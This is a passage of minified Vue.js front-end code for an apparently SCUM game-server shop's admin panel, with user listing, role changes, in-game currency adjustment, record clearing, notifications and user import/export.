ID",key:"steamId",dataIndex:"steamId",width:180,align:"center",scopedSlots:{customRender:"steamId"}},{title:"美金",key:"dollars",dataIndex:"dollars",width:100,align:"center",scopedSlots:{customRender:"dollars"}},{title:"Email",key:"email",dataIndex:"email",width:180,align:"center",scopedSlots:{customRender:"email"}},{title:"注册手机",key:"phone",dataIndex:"phone",width:150,align:"center",scopedSlots:{customRender:"phone"}},{title:"账号状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"VIP等级",key:"level",dataIndex:"level",width:80,align:"center",scopedSlots:{customRender:"level"}},{title:"累计登录游戏时长",key:"countLoginMinites",dataIndex:"countLoginMinites",width:130,align:"center",scopedSlots:{customRender:"countLoginMinutes"}},{title:"上次签到时间",key:"lastCheckInTimeStamp",dataIndex:"lastCheckInTimeStamp",width:120,align:"center",scopedSlots:{customRender:"lastCheckInTimeStamp"}}],userListData:[],userListPagination:{pageSize:20,pageNum:1,total:0},levelList:[],levelDetailList:[],militaryLevelList:[],expandedUserIds:[],exportLoading:!1,showImportUsersItemModal:!1,importUsersType:"own",importUsersInitPassword:"",importUsersHasBoughtWelcomepack:!1,importUsersBuyWelcomeDidiCarTime:void 0,importUsersLevelRelative:void 0,importUsersLoading:!1,importUsersTxt:!1,showControlUserMoneyOnServerModal:!1,controlUserMoneyOnServerloading:!1,controlUserMoneyOnServerEditForm:{userId:null,moneyType:"normal",controlType:"set",value:0},controlUserMoneyOnServerRules:{moneyType:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){null!=t&&t.length?i():i(new Error("请选择"))}}],controlType:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){null!=t&&t.length?i():i(new Error("请选择"))}}],value:[{required:!0,trigger:"change",message:"请输入金额",validator:function(e,t,i){"number"==typeof t?i():i(new Error("请输入金额"))}}]},selectedRowKeys:[],thirdPartyRobotUidConfigs:{}}},mounted:function(){var e=this;this.$route.query.id&&(this.userListFilter.id=this.$route.query.id),this.$route.query.userName&&(this.userListFilter.userName=this.$route.query.userName),this.$route.query.steamId&&(this.userListFilter.steamId=this.$route.query.steamId),this.$nextTick((function(){e.getThirdPartyRobotUidConfigs(),e.getLevelList(),e.getMilitaryLevelList(),e.getUserList(void 0,e.userListFilter.id,e.userListFilter.userName,e.$route.query.steamId)}))},methods:{clickUpdateAllWelcomePacks:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return t.updateAllWelcomePacksLoading=!0,i.prev=1,i.next=4,f({method:"PUT",url:"userAdminSys/updateAllWelcomePacks",data:{isUsed:e}});case 4:a=i.sent,t.updateAllWelcomePacksLoading=!1,200===a.status?(t.$message.success(a.msg),t.updateAllWelcomePacksLoading=!1,t.onUserListFilter()):(console.log("错误",a),t.$message.error(a.msg)),i.next=13;break;case 9:i.prev=9,i.t0=i.catch(1),console.error(i.t0),t.updateAllWelcomePacksLoading=!1;case 13:case"end":return i.stop()}}),i,null,[[1,9]])})))()},onUserListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/user"}),this.userListPagination.pageNum=1,this.$nextTick((function(){e.getUserList(!0)}))},onUserListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/user"}),this.userListPagination.pageNum=1,this.$nextTick((function(){e.getUserList()}))},onChangeUserListPagination:function(e){var t=this;this.userListPagination.pageNum=e,this.$nextTick((function(){t.getUserList()}))},onShowSizeChangeUserListPagination:function(e,t){var i=this;this.userListPagination.pageNum=1,this.userListPagination.pageSize=t,this.$nextTick((function(){i.getUserList()}))},getUserList:function(e,t,i,a){var n=this;return Object(o.a)(regeneratorRuntime.mark((function r(){var o,l,c,d,u,p;return regeneratorRuntime.wrap((function(r){for(;;)switch(r.prev=r.next){case 0:return o=n.userListPagination,l=o.pageNum,c=o.pageSize,e?(n.userListFilter={id:void 0,userName:void 0,email:void 0,phone:void 0,steamId:void 0,level:void 0,status:void 0,isOnline:void 0},d={pageNum:l,pageSize:c}):(u=Object(A.cloneDeep)(n.userListFilter),d=Object(s.a)({pageNum:l,pageSize:c},u)),n.loadingUserListTable=!0,r.prev=3,r.next=6,f({method:"GET",url:"/userAdminSys/listUsers",params:d});case 6:p=r.sent,n.loadingUserListTable=!1,200===p.status&&(n.userListPagination.total=p.data.count,n.userListData=p.data.list,n.$nextTick((function(){if(void 0!==t){var e=p.data.list.find((function(e){return e.id===t}));n.$set(n,"expandedUserIds",[e.id])}else if(void 0!==i){var r=p.data.list.find((function(e){return e.userName===i}));n.$set(n,"expandedUserIds",[r.id])}else if(void 0!==a){var o=p.data.list.find((function(e){return e.steamId===a}));n.$set(n,"expandedUserIds",[o.id])}else n.$set(n,"expandedUserIds",[])}))),r.next=15;break;case 11:r.prev=11,r.t0=r.catch(3),console.error(r.t0),n.loadingUserListTable=!1;case 15:case"end":return r.stop()}}),r,null,[[3,11]])})))()},getThirdPartyRobotUidConfigs:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/info",params:{name:"ThirdPartyRobotUidConfigs"}});case 3:200===(i=t.sent).status&&(e.thirdPartyRobotUidConfigs=i.data.value),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getLevelList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/levelAdminSys/list",params:{pageSize:99999,pageNum:1}});case 3:200===(i=t.sent).status&&(e.levelList=i.data.list.map((function(e){return e.level})),e.levelDetailList=i.data.list),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},getMilitaryLevelList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/info",params:{name:"MilitaryLevelConfigs"}});case 3:200===(i=t.sent).status&&(e.militaryLevelList=null===(a=i.data)||void 0===a?void 0:a.value),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanAllUserDollarChange:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"DELETE",url:"/userDollarChangeAdminSys/cleanAll"});case 3:200===t.sent.status&&(e.$message.success("操作成功"),e.getUserList()),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanAllUserLogin:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"DELETE",url:"/userAdminSys/cleanAllUserLogin"});case 3:200===t.sent.status&&(e.$message.success("操作成功"),e.getUserList()),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanAllUserNotification:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"DELETE",url:"/userAdminSys/cleanUserNotification"});case 3:200===t.sent.status&&(e.$message.success("操作成功"),e.getUserList()),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanAllUserCountLoginMinutes:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"PUT",url:"/userAdminSys/resetAllUserCountLoginMinites"});case 3:200===t.sent.status&&(e.$message.success("操作成功"),e.getUserList()),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},deleteUser:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={userId:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUser",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getUserList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteUsers:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l,c;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={userIds:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"DELETE",url:"/userAdminSys/deleteUsers",data:i});case 4:200===(a=t.sent).status&&(null!=a&&null!==(n=a.data)&&void 0!==n&&null!==(r=n.failIds)&&void 0!==r&&r.length?e.$message.warning("成功".concat(null==a||null===(o=a.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==a||null===(s=a.data)||void 0===s||null===(l=s.failIds)||void 0===l||null===(c=l.map((function(e){return"ID"+e.userId+": "+e.error})))||void 0===c?void 0:c.join(","))):e.$message.success("操作成功"),e.getUserList()),t.next=11;break;case 8:t.prev=8,t.t0=t.catch(1),console.error(t.t0);case 11:case"end":return t.stop()}}),t,null,[[1,8]])})))()},cleanUserLogin:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={userId:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/userAdminSys/cleanUserLoginByUser",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getUserList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},handleChangeUserAdmin:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=t.userAdmin&&t.userAdmin.id?t.userAdmin.isSysAdmin?"sysAdmin":t.userAdmin.isReadOnly?"adminReadOnly":"admin":"user",r=e.key,o=t.id,"user"===r?(l="DELETE",c="/adminAdminSys/delete",d={params:{userId:o}}):"admin"===r?"sysAdmin"===n||"adminReadOnly"===n?(l="PUT",c="/adminAdminSys/update",d={data:{userId:o,isSysAdmin:!1,isReadOnly:!1}}):(l="POST",c="/adminAdminSys/add",d={data:{userId:o,isSysAdmin:!1,isReadOnly:!1}}):"adminReadOnly"===r?"sysAdmin"===n||"admin"===n?(l="PUT",c="/adminAdminSys/update",d={data:{userId:o,isSysAdmin:!1,isReadOnly:!0}}):(l="POST",c="/adminAdminSys/add",d={data:{userId:o,isSysAdmin:!1,isReadOnly:!0}}):"admin"===n||"adminReadOnly"===n?(l="PUT",c="/adminAdminSys/update",d={data:{userId:o,isSysAdmin:!0}}):(l="POST",c="/adminAdminSys/add",d={data:{userId:o,isSysAdmin:!0}}),a.prev=4,a.next=7,f(Object(s.a)({method:l,url:c},d));case 7:200===a.sent.status&&(i.$message.success("操作成功"),i.getUserList()),a.next=14;break;case 11:a.prev=11,a.t0=a.catch(4),console.error(a.t0);case 14:case"end":return a.stop()}}),a,null,[[4,11]])})))()},cleanUserDollarChange:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={userId:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/userDollarChangeAdminSys/cleanByUser",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getUserList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},cleanUserCountLoginMinutes:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,i.next=3,f({method:"PUT",url:"/userAdminSys/resetUserCountLoginMinites",data:{userId:e}});case 3:200===i.sent.status&&(t.$message.success("操作成功"),t.getUserList()),i.next=10;break;case 7:i.prev=7,i.t0=i.catch(0),console.error(i.t0);case 10:case"end":return i.stop()}}),i,null,[[0,7]])})))()},submitUpdateUserDollar:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function e(){return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:t.$refs.updateUserDollarForm.validate(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(i){var a,n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(!i){e.next=16;break}return a={change:t.updateUserDollarForm.change},t.updateUserDollarForm.reason&&(a.reason=t.updateUserDollarForm.reason),t.updateUserDollarLoading=!0,e.prev=4,e.next=7,f({method:"PUT",url:"/userAdminSys/updateAllUserDollar",data:a});case 7:n=e.sent,t.updateUserDollarLoading=!1,200===n.status?(t.$message.success("修改成功"),t.showUpdateUserDollarModal=!1,t.updateUserDollarForm={change:0,reason:""},t.getUserList()):(console.log("错误",n),t.$message.error(n.msg)),e.next=16;break;case 12:e.prev=12,e.t0=e.catch(4),console.error(e.t0),t.updateUserDollarLoading=!1;case 16:case"end":return e.stop()}}),e,null,[[4,12]])})));return function(t){return e.apply(this,arguments)}}());case 1:case"end":return e.stop()}}),e)})))()},submitSetUserDollar:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.setUserDollarForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return a={dollars:e.setUserDollarForm.dollars},e.setUserDollarForm.reason&&(a.reason=e.setUserDollarForm.reason),e.setUserDollarLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/userAdminSys/setAllUserDollar",data:a});case 7:n=t.sent,e.setUserDollarLoading=!1,200===n.status?(e.$message.success("修改成功"),e.showSetUserDollarModal=!1,e.setUserDollarForm={change:0,reason:""},e.getUserList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.setUserDollarLoading=!1;case 16:case"end":return t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},clickExportUsersList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.exportLoading=!0,t.next=4,f({method:"GET",url:"/userAdminSys/export"});case 4:200===(i=t.sent).status&&(a=JSON.stringify({data:i.data}),(n=document.createElement("a")).setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(a)),n.setAttribute("download","users.log"),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),e.exportLoading=!1,e.$message.success("导出成功")),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.exportLoading=!1,e.$message.error("下载出错："+t.t0.toString());case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitImportUsers:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l,c,d;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.importUsersLoading=!0,"own"!==e.importUsersType){t.next=28;break}if(t.prev=2,(i=JSON.parse(e.importUsersTxt)).data&&i.data.users&&i.data.user_dollars&&i.data.user_locations&&i.data.user_passwords&&void 0===i.data.users.find((function(e){return!(e.email&&e.phone&&e.steamId&&"string"==typeof e.userName&&e.userName.length&&"boolean"==typeof e.hasBoughtWelcomepack&&"number"==typeof e.buyWelcomeDidiCarTime&&e.status)}))&&void 0===i.data.user_dollars.find((function(e){return!(e.userId&&"number"==typeof e.dollars&&"number"==typeof e.chargeDollars&&"number"==typeof e.level&&void 0!==e.gesture)}))&&void 0===i.data.user_locations.find((function(e){return!(e.userId&&e.description&&e.locations)}))&&void 0===i.data.user_passwords.find((function(e){return!(e.userId&&e.password)}))){t.next=8;break}return e.importUsersLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 8:return t.prev=8,t.next=11,f({method:"POST",url:"/userAdminSys/import",data:{data:i.data}});case 11:if(a=t.sent,e.importUsersLoading=!1,200===a.status){for(r in e.showImportUsersItemModal=!1,e.importUsersLoading=!1,n="",a.data)o=a.data[r],s=o.success,l=o.fail,n+="已执行导入".concat(r,"，成功").concat(s,"条，失败").concat(l,"条\n");e.$message.success(n),e.getUserList()}else console.log("错误",a),e.$message.error(a.msg);t.next=20;break;case 16:t.prev=16,t.t0=t.catch(8),e.importUsersLoading=!1,e.$message.error(t.t0);case 20:t.next=26;break;case 22:t.prev=22,t.t1=t.catch(2),e.importUsersLoading=!1,e.$message.error("导入格式不正确");case 26:t.next=53;break;case 28:if(t.prev=28,(c=JSON.parse(e.importUsersTxt)).rows){t.next=34;break}return e.importUsersLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 34:t.next=41;break;case 36:return t.prev=36,t.t2=t.catch(28),e.importUsersLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 41:return t.prev=41,t.next=44,f({method:"POST",url:"/userAdminSys/importYingZi",data:{data:c.rows,initPassword:e.importUsersInitPassword,hasBoughtWelcomepack:e.importUsersHasBoughtWelcomepack,buyWelcomeDidiCarTime:e.importUsersBuyWelcomeDidiCarTime,levelRelative:e.importUsersLevelRelative}});case 44:d=t.sent,e.importUsersLoading=!1,200===d.status?(e.showImportUsersItemModal=!1,e.importUsersLoading=!1,e.$message.success(d.msg),e.getUserList()):(console.log("错误",d),e.$message.error(d.msg)),t.next=53;break;case 49:t.prev=49,t.t3=t.catch(41),e.importUsersLoading=!1,e.$message.error(t.t3);case 53:case"end":return t.stop()}}),t,null,[[2,22],[8,16],[28,36],[41,49]])})))()},controlUserOnServer:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return a.prev=0,a.next=3,f({method:"POST",url:"/userAdminSys/controlUserOnServer",data:{userId:e,control:t}});case 3:200===(n=a.sent).status?(i.$message.success("操作成功"),i.onUserListCleanFilter()):i.$message.error(n.data.msg),a.next=11;break;case 7:a.prev=7,a.t0=a.catch(0),console.log(a.t0),i.$message.error(a.t0.toString());case 11:case"end":return a.stop()}}),a,null,[[0,7]])})))()},gotoCreateReport:function(e){this.$router.push({path:"/scum-ban",query:{steamId:e.steamId}})},showControlUserMoneyOnServer:function(e){this.showControlUserMoneyOnServerModal=!0,this.$set(this,"controlUserMoneyOnServerEditForm",{userId:e,moneyType:"normal",controlType:"set",value:0})},submitControlUserMoneyOnServer:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.controlUserMoneyOnServerEditForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=15;break}return a={userId:e.controlUserMoneyOnServerEditForm.userId,moneyType:e.controlUserMoneyOnServerEditForm.moneyType,controlType:e.controlUserMoneyOnServerEditForm.controlType,value:e.controlUserMoneyOnServerEditForm.value},e.controlUserMoneyOnServerloading=!0,t.prev=3,t.next=6,f({method:"POST",url:"/userAdminSys/controlUserMoneyOnServer",data:a});case 6:n=t.sent,e.controlUserMoneyOnServerloading=!1,200===n.status?(e.$message.success("修改成功"),e.showControlUserMoneyOnServerModal=!1,e.getUserList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.controlUserMoneyOnServerloading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},handleSearchNotificationUser:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t){var i,a;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,i={keyword:t},e.next=4,f({method:"GET",url:"/userAdminSys/searchUsers",params:i});case 4:200===(a=e.sent).status&&(this.searchNotificationUserNameList=a.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t){return e.apply(this,arguments)}}(),500),submitSendUserNotification:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.sendUserNotificationForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=15;break}return a={userIds:e.sendUserNotificationForm.userIds,content:e.sendUserNotificationForm.content,status:"unread"},e.sendUserNotificationLoading=!0,t.prev=3,t.next=6,f({method:"POST",url:"/userAdminSys/addUserNotification",data:a});case 6:n=t.sent,e.sendUserNotificationLoading=!1,200===n.status?(e.$message.success("新增成功"),e.sendUserNotificationLoading=!1,e.showSendUserNotificationModal=!1,e.getUserList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.sendUserNotificationLoading=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()}}},ue=de,pe=Object(S.a)(ue,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"用户列表"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",{attrs:{disabled:!(e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role))},on:{click:function(t){return e.clickUpdateAllWelcomePacks(!1)}}},[e._v("新手礼包/滴滴车/新手签到N日礼包全部重置")]),i("a-menu-item",{attrs:{disabled:!(e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role))},on:{click:function(t){return e.clickUpdateAllWelcomePacks(!0)}}},[e._v("新手礼包/滴滴车全部更新为已领取")])],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{attrs:{size:"small",icon:"swap",loading:e.updateAllWelcomePacksLoading}},[e._v("批量修改新手礼包"),i("a-icon",{attrs:{type:"down"}})],1)],1),i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",{on:{click:function(t){e.showUpdateUserDollarModal=!0}}},[e._v("批量增加/减少美金")]),i("a-menu-item",{on:{click:function(t){e.showSetUserDollarModal=!0}}},[e._v("批量设置美金")])],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"swap"}},[e._v("批量操作用户美金"),i("a-icon",{attrs:{type:"down"}})],1)],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"setting"},on:{click:function(t){e.showSendUserNotificationModal=!0}}},[e._v("批量发送商城推送")]),i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",[i("a-popconfirm",{attrs:{placement:"left",title:"确定要清除所有美金流水记录吗"},on:{confirm:e.cleanAllUserDollarChange}},[e._v(" 清除所有美金流水记录 ")])],1),i("a-menu-item",[i("a-popconfirm",{attrs:{placement:"left",title:"确定要清除所有用户登录记录吗"},on:{confirm:e.cleanAllUserLogin}},[e._v(" 清除所有用户登录记录 ")])],1),i("a-menu-item",[i("a-popconfirm",{attrs:{placement:"left",title:"确定要清除所有用户通知消息记录吗"},on:{confirm:e.cleanAllUserNotification}},[e._v(" 清除所有用户通知消息记录 ")])],1),i("a-menu-item",[i("a-popconfirm",{attrs:{placement:"left",title:"确定要重置所有用户登陆游戏时长累计吗"},on:{confirm:e.cleanAllUserCountLoginMinutes}},[e._v(" 重置所有用户登陆游戏时长累计 ")])],1)],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete",loading:e.updateAllWelcomePacksLoading}},[e._v("清除/重置记录"),i("a-icon",{attrs:{type:"down"}})],1)],1),i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",{on:{click:function(){e.importUsersTxt="",e.showImportUsersItemModal=!0}}},[e._v("导入用户")]),i("a-menu-item",{attrs:{disabled:e.exportLoading},on:{click:e.clickExportUsersList}},[e._v("导出所有用户")])],1),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"swap"}},[e._v("导入/导出用户"),i("a-icon",{attrs:{type:"down"}})],1)],1)]:e._e(),i("a-modal",{attrs:{title:"导入用户","mask-closable":!1,width:600},on:{cancel:function(){e.showImportUsersItemModal=!1,e.importUsersTxt=""}},model:{value:e.showImportUsersItemModal,callback:function(t){e.showImportUsersItemModal=t},expression:"showImportUsersItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.importUsersLoading},on:{click:e.submitImportUsers}},[e._v("开始导入")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[e._v("*")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("选择导入类型：")]),i("a-radio-group",{attrs:{buttonStyle:"solid",size:"small"},model:{value:e.importUsersType,callback:function(t){e.importUsersType=t},expression:"importUsersType"}},[i("a-radio-button",{attrs:{value:"own"}},[e._v("从本系统导入")]),i("a-radio-button",{attrs:{value:"yingzi"}},[e._v("从影子商城导入")])],1),e.importUsersType&&"own"!==e.importUsersType?i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f","margin-left":"15px"}},[e._v("*打击奸商，造福SCUM圈")]):e._e()],1),"yingzi"===e.importUsersType?[i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",[e._v("初始密码：")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},model:{value:e.importUsersInitPassword,callback:function(t){e.importUsersInitPassword=t},expression:"importUsersInitPassword"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",[e._v("会员等级差值：")]),i("a-input-number",{staticStyle:{width:"200px","margin-left":"10px"},model:{value:e.importUsersLevelRelative,callback:function(t){e.importUsersLevelRelative=t},expression:"importUsersLevelRelative"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",[e._v("是否已购买新手套餐：")]),i("a-switch",{attrs:{"checked-children":"是","un-checked-children":"否"},model:{value:e.importUsersHasBoughtWelcomepack,callback:function(t){e.importUsersHasBoughtWelcomepack=t},expression:"importUsersHasBoughtWelcomepack"}})],1),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",[e._v("滴滴车剩余次数：")]),i("a-input-number",{staticStyle:{width:"200px","margin-left":"10px"},model:{value:e.importUsersBuyWelcomeDidiCarTime,callback:function(t){e.importUsersBuyWelcomeDidiCarTime=t},expression:"importUsersBuyWelcomeDidiCarTime"}})],1)]:e._e(),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[e._v("*")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("导入内容：")])]),i("div",{staticStyle:{width:"100%"}},[i("a-input",{staticStyle:{width:"100%","margin-top":"10px"},attrs:{type:"textarea","auto-size":{minRows:15,maxRows:15}},model:{value:e.importUsersTxt,callback:function(t){e.importUsersTxt=t},expression:"importUsersTxt"}})],1)],2),i("a-modal",{attrs:{title:"批量增加/减少用户美金","mask-closable":!1,width:500},on:{cancel:function(){e.updateUserDollarForm.change=0,e.updateUserDollarForm.reason=""}},model:{value:e.showUpdateUserDollarModal,callback:function(t){e.showUpdateUserDollarModal=t},expression:"showUpdateUserDollarModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.updateUserDollarLoading},on:{click:e.submitUpdateUserDollar}},[e._v("提交")])],1),e.showUpdateUserDollarModal?i("a-form-model",{ref:"updateUserDollarForm",staticStyle:{"max-width":"500px"},attrs:{model:e.updateUserDollarForm,rules:e.updateUserDollarRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"变动金额",prop:"change",extra:"不为0的数字"}},[i("a-input-number",{staticStyle:{width:"250px"},model:{value:e.updateU